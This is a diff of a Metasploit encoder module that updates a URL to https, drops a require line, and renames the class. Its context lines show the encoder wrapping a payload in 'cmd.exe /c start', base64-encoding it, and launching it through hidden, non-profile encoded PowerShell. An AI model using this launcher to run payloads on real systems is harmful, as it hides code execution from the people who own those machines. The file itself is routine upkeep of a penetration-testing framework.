@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Encoder
+class MetasploitModule < Msf::Encoder
   Rank = ExcellentRanking
 
   def initialize
@@ -50,5 +48,4 @@ class Metasploit3 < Msf::Encoder
     base64 = Rex::Text.encode_base64(Rex::Text.to_unicode("cmd.exe /c start #{buf}"))
     cmd = "powershell -w hidden -nop -e #{base64}"
   end
-
 end
